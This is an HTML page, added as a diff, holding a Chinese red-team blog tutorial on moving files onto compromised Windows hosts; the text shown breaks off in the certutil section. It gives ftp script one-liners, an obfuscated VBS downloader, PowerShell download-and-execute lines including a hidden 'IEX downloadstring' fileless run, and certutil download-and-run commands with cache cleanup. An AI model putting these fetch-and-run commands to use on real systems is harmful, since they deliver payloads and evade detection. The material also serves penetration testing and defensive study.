@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>005-内网文件传输技术 Windows篇 - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil、bitsadmin、Xcopy，都是些老技术，整理分享。"><meta name="keywords" content='pentest, RedTeam, 内网渗透'>
+  <meta itemprop="name" content="005-内网文件传输技术 Windows篇">
+  <meta itemprop="description" content="本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil、bitsadmin、Xcopy，都是些老技术，整理分享。">
+  <meta itemprop="datePublished" content="2021-11-13T17:25:01+08:00">
+  <meta itemprop="dateModified" content="2021-11-13T17:25:01+08:00">
+  <meta itemprop="wordCount" content="1613">
+  <meta itemprop="keywords" content="Pentest,RedTeam,内网渗透"><meta property="og:url" content="http://localhost:1313/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="005-内网文件传输技术 Windows篇">
+  <meta property="og:description" content="本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil、bitsadmin、Xcopy，都是些老技术，整理分享。">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-11-13T17:25:01+08:00">
+    <meta property="article:modified_time" content="2021-11-13T17:25:01+08:00">
+    <meta property="article:tag" content="Pentest">
+    <meta property="article:tag" content="RedTeam">
+    <meta property="article:tag" content="内网渗透">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="005-内网文件传输技术 Windows篇">
+  <meta name="twitter:description" content="本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil、bitsadmin、Xcopy，都是些老技术，整理分享。">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/" title="005-内网文件传输技术 Windows篇 - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/" title="004-内网渗透 内网信息搜集脑图" /><link rel="next" type="text/html" href="http://localhost:1313/posts/hackthebox-legacy/" title="HTB靶机 Legacy WriteUp" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/index.md" title="005-内网文件传输技术 Windows篇 - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "005-内网文件传输技术 Windows篇",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87\/"
+    },"genre": "posts","keywords": "pentest, RedTeam, 内网渗透","wordcount":  1613 ,
+    "url": "http:\/\/localhost:1313\/posts\/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87\/","datePublished": "2021-11-13T17:25:01+08:00","dateModified": "2021-11-13T17:25:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": "本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil、bitsadmin、Xcopy，都是些老技术，整理分享。"
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>005-内网文件传输技术 Windows篇</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/pentest/" class="post-category" title="分类 - Pentest"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pentest</a></span></div><div class="post-meta-line"><span title="发布于 2021-11-13 17:25:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2021-11-13">2021-11-13</time></span>&nbsp;<span title="1613 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#一ftp">一、ftp</a></li>
+    <li><a href="#二vbs">二、VBS</a></li>
+    <li><a href="#三powershell">三、Powershell</a></li>
+    <li><a href="#四certutil">四、certutil</a></li>
+    <li><a href="#五bitsadmin">五、bitsadmin</a></li>
+    <li><a href="#六-xcopy">六 、Xcopy</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><p>本文简述内网Windows主机文件传输技术，包括利用ftp、VBScript、powershell、certutil.exe、bitsadmin、Xcopy，都是些老技术，整理分享。</p>
+<h2 id="一ftp" class="heading-element"><span>一、ftp</span>
+  <a href="#%e4%b8%80ftp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>windows 全平台自带ftp，在实战中需要考虑两点。</p>
+<ul>
+<li>数据传输的完整性。</li>
+<li>代码精简</li>
+</ul>
+<p>ftp文件的传输方式：</p>
+<ul>
+<li>Binary，二进制方式；</li>
+<li>ASCII，ASCII传输</li>
+</ul>
+<p>在FTP文件传输过程中，ASCII传输HTML和文本编写的文件，而二进制码传输可以传送文本和非文本（执行文件，压缩文件，图片等），具有通用性，二进制码传输速度比ASCII传输要快。</p>
+<p>命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> <span class="nb">echo</span> open 192.168.1.115 21&gt; ftp.txt 
+</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> 123&gt;&gt; ftp.txt          <span class="c1"># 用户名 </span>
+</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> 123&gt;&gt; ftp.txt          <span class="c1"># 密码 </span>
+</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> binary &gt;&gt; ftp.txt  <span class="c1"># bin模式，设置二进制传输类型 </span>
+</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> get robots.txt &gt;&gt; ftp.txt     <span class="c1"># 接收指定文件 </span>
+</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> bye &gt;&gt; ftp.txt         <span class="c1"># 终止ftp会话并退出，同quit  </span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> <span class="c1"># 指定包含 FTP 命令的文本文件；命令在 FTP 启动后自动运行。 </span>
+</span></span><span class="line"><span class="cl"> ftp -s:ftp.txt   
+</span></span><span class="line"><span class="cl"> del /F /Q ftp.txt             <span class="c1"># 安静模式强制删除ftp文件</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640.png" alt="图片" srcset="/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640.png?size=small, /posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640.png?size=medium 1.5x, /posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640.png?size=large 2x" data-title="图片" style="--width: 752px;--aspect-ratio: 752 / 428;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>精简成一句话</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> open IP &gt; o<span class="p">&amp;</span><span class="nb">echo</span> user UserName Password &gt;&gt; o <span class="p">&amp;</span><span class="nb">echo</span> get Target_File.exe &gt;&gt; o <span class="p">&amp;</span><span class="nb">echo</span> quit &gt;&gt; o <span class="p">&amp;</span>ftp ‐n ‐s:o <span class="p">&amp;</span>del /F /Q o  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># -A匿名登录下载文件 </span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> open IP &gt; o <span class="p">&amp;</span> <span class="nb">echo</span> get Target_File.exe &gt;&gt; o <span class="p">&amp;</span><span class="nb">echo</span> quit&gt;&gt;o <span class="p">&amp;</span>ftp -A -n -s:o <span class="p">&amp;</span> del /F /Q o</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="二vbs" class="heading-element"><span>二、VBS</span>
+  <a href="#%e4%ba%8cvbs" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>编写VBS脚本并保存</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set a=createobject(&#34;adod&#34;+&#34;b.stream&#34;):set w=createobject(&#34;micro&#34;+&#34;soft.xmlhttp&#34;):w.open&#34;get&#34;,wsh.arguments( 0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以用echo方式写入vbs</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> echo set a=createobject(^&#34;adod^&#34;+^&#34;b.stream^&#34;):set w=createobject(^&#34;micro^&#34;+^&#34;soft.xmlhttp^&#34;):w.open ^&#34;get^&#34;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; downfile.vbs</span></span></code></pre></td></tr></table>
+</div>
+</div><p>命令行下载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cscript downfile.vbs http://192.168.126.130:8000/flag.txt  C:\Inetpub\b.txt</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700358.png" alt="图片" srcset="/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700358.png?size=small, /posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700358.png?size=medium 1.5x, /posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700358.png?size=large 2x" data-title="图片" style="--width: 832px;--aspect-ratio: 832 / 464;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>也可以把参数直接写入vbs文件中，直接执行。</p>
+<p>优点：支持windows全版本系列缺点：对https不友好</p>
+<p>VBS作为一门代码语言，可以有多种代码编写的方式，不只这一种</p>
+<h2 id="三powershell" class="heading-element"><span>三、Powershell</span>
+  <a href="#%e4%b8%89powershell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># 远程下载文件到本地： </span>
+</span></span><span class="line"><span class="cl">powershell <span class="o">(</span>new-object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">&#39;http://192.168.183.138:8000/test.txt&#39;</span>,<span class="s1">&#39;test.exe&#39;</span><span class="o">)</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">powershell -exec bypass -c <span class="o">(</span>new-object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">&#39;http://192.168.111.1:8080/exp.exe&#39;</span>,<span class="s1">&#39;C:\Users\1day\Desktop\Tools\exp.exe&#39;</span><span class="o">)</span> 
+</span></span><span class="line"><span class="cl">exp.exe  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 直接把文本转换为exe文件运行，无残留文件 </span>
+</span></span><span class="line"><span class="cl">powershell -nop -w hidden -c <span class="s2">&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.183.138:8000/test.txt&#39;))&#34;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="四certutil" class="heading-element"><span>四、certutil</span>
+  <a href="#%e5%9b%9bcertutil" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Certutil.exe是一个命令行程序，作为证书服务的一部分安装。您可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">certutil.exe -urlcache -split -f http://192.168.16.157/exp.exe 
+</span></span><span class="line"><span class="cl"><span class="c1"># certutil.exe下载有个弊端，它的每一次下载都有留有缓存，所以每次下载后需要清除缓存 </span>
+</span></span><span class="line"><span class="cl">certutil.exe -urlcache -split -f http://192.168.16.157/exp.exe delete //删除缓存 
+</span></span><span class="line"><span class="cl">exp.exe 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-URLCache             -- 显示或删除 URL 缓存项目 
+</span></span><span class="line"><span class="cl">-split                -- 分离嵌入的 ASN.1 元素，并保存到文件 
+</span></span><span class="line"><span class="cl">-f                    -- 强制覆盖</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700839.png" alt="图片" srcset="/posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700839.png?size=small, /posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700839.png?size=medium 1.5x, /posts/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-windows%E7%AF%87/resource/%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-Windows%E7%AF%87.assets/640-20230220172700839.png?size=large 2x" data-title="图片" style="--width: 608px;--aspect-ratio: 608 / 453;background: 